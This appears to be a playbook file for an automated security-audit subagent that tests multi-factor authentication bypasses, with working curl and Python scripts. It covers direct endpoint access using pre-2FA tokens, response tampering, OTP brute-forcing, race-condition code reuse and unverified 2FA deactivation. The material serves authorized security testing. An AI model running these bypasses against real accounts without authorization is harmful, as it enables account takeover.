# Subagent 04: Multi-Factor Authentication (2FA/MFA) Bypass Auditing

## Role & Mission
Responsible for evaluating Multi-Factor Authentication resilience: testing direct access bypasses, response status-code tampering (400/403 to 200 OK), OTP brute-forcing and concurrency flaws, code reuse, sequential generation patterns, backup code entropy, and unverified 2FA deactivation.

## Assigned Checklist Tasks (10 Checks)
- **Check 20:** Multi-factor authentication bypass via direct endpoint navigation (`/dashboard`)
- **Check 21:** Direct API access to post-authentication endpoints using pre-2FA session tokens
- **Check 22:** 2FA OTP verification code brute-forcing (insufficient rate limiting)
- **Check 23:** Predictable or sequential OTP code generation
- **Check 24:** 2FA code reuse within validity window
- **Check 25:** Backup/recovery code entropy and structure auditing
- **Check 26:** Disabling 2FA without verifying current 2FA code or password
- **Check 27:** SMS interception / SIM swapping resilience & channel evaluation
- **Check 28:** 2FA bypass via HTTP response manipulation (tampering 400/403 to 200 OK)
- **Check 30:** Rate limiting and velocity checks on the 2FA verification endpoint

---

## Standardized Execution Playbook

### Step 1: Direct Endpoint Access Bypass (Checks 20, 21)
*Vulnerability Identification:* Applications frequently set the session cookie or JWT on Step 1 (username + password) and only enforce 2FA client-side on the frontend:

```bash
# 1. Complete Step 1 Authentication
LOGIN_RESP=$(curl -s -i -X POST "https://<target>/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"valid_user", "password":"valid_password"}')

# Extract session cookie or bearer token from Step 1
SESSION_TOKEN=$(echo "$LOGIN_RESP" | grep -iE "(Set-Cookie|token)" | head -n 1)

# 2. Directly request sensitive post-auth endpoints without completing OTP (Checks 20, 21)
POST_AUTH_PATHS=(
  "/dashboard"
  "/account/settings"
  "/api/user/profile"
  "/api/wallet/balance"
  "/admin/overview"
)

for pap in "${POST_AUTH_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: $SESSION_TOKEN" "https://<target>${pap}")
  if [ "$STATUS" = "200" ]; then
    echo "[!] CRITICAL: 2FA Bypassed via Direct Access to: ${pap} [HTTP 200]" >> artifacts/2fa_bypasses.txt
  fi
done
```

### Step 2: Response Manipulation Bypass (Check 28 & 2FA-Notes.txt)
*Methodology from 2FA-Notes.txt:*
When submitting an incorrect OTP code, intercept the HTTP response and tamper the status code and JSON body:

```http
# Original Response:
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"success": false, "message": "Invalid OTP code"}

# Tampered Response:
HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "message": "Verification successful", "tfaEnabled": true}
```
If the frontend client immediately redirects to the dashboard and loads authenticated data, the 2FA verification check is client-side only.

### Step 3: OTP Brute-Force & Rate Limiting (Checks 22, 30)
Evaluate whether 4-digit (10,000 combinations) or 6-digit (1,000,000 combinations) OTP codes can be enumerated:

```bash
# Test for velocity blocking on /api/auth/verify-2fa
python3 -c "
import requests

url = 'https://<target>/api/auth/verify-2fa'
headers = {'Authorization': 'Bearer $PARTIAL_SESSION_TOKEN', 'Content-Type': 'application/json'}

codes = [f'{i:06d}' for i in range(50)] # Test first 50 codes
responses = []

for code in codes:
    r = requests.post(url, json={'code': code}, headers=headers)
    responses.append(r.status_code)

print('OTP Brute Force Status Codes:', set(responses))
if 429 in responses:
    print('[+] 2FA Rate limiting active.')
else:
    print('[!] WARNING: No rate limit on 2FA verification!')
"
```

### Step 4: OTP Code Reuse & Race Conditions (Check 24)
A valid OTP code must be immediately invalidated upon first use:

```bash
# Send two simultaneous verification requests using the exact same valid OTP
curl -s -X POST "https://<target>/api/auth/verify-2fa" -d '{"code":"123456"}' &
curl -s -X POST "https://<target>/api/auth/verify-2fa" -d '{"code":"123456"}' &
wait
```

### Step 5: Unverified 2FA Deactivation (Check 26)
Test if an authenticated session can disable 2FA without entering the current OTP code:

```bash
# Attempt to disable 2FA omitting OTP verification
curl -s -i -X POST "https://<target>/api/user/2fa/disable" \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' > artifacts/2fa_disable_test.json

if grep -qi "success" artifacts/2fa_disable_test.json; then
  echo "[!] CRITICAL: 2FA can be disabled without entering current 2FA code!" >> artifacts/2fa_bypasses.txt
fi
```

### Step 6: Backup Codes Entropy & Predictability (Check 25)
Inspect backup codes generated during 2FA setup:
- Are they purely numeric 4-digit codes?
- Do they follow a predictable pseudorandom sequence?
- Can recovery codes be used multiple times?

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_04_2fa_report.md`
